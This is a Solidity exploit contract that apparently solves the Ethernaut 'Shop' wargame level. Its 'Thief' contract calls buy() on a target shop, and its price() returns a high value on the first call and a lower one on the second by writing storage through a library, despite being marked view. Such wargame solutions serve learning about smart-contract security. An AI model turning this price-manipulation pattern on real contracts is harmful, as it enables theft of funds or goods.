//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function buy() external;
}

library StaticProof {
    
    struct Juke {
        uint heisenberg;
    }

    // function diamondStore() internal pure returns (Juke storage j) {
    //     bytes32 position = keccak256("diamond.standard.diamond.storage");
    //     assembly { j.slot := position }
    // }

    // function flip() public {
    //     Juke storage j = diamondStore();
    //     if (j.heisenberg == 0) {
    //         j.heisenberg = 102;
    //     } else {
    //         j.heisenberg = 0;
    //     }
    // }

    function readWrite(Juke storage a) external returns (uint) {
        // Juke storage j = diamondStore();
        // flip();
        // return j.heisenberg;
        uint _b = a.heisenberg;
        a.heisenberg = divide(a);
        return _b;
    }

    function divide(Juke storage a) internal view returns (uint) {
        uint _b = a.heisenberg/50;
        return _b;
    }
}

contract Thief {
    using StaticProof for StaticProof.Juke;
    StaticProof.Juke private a;

    function steal(address $your_ethernaut_address_here) public {
        a.heisenberg = 150;
        Shop shop = Shop($your_ethernaut_address_here);
        shop.buy();
    }

    function price() external view returns (uint) {
        uint b = a.readWrite();
        return b;
    }
}
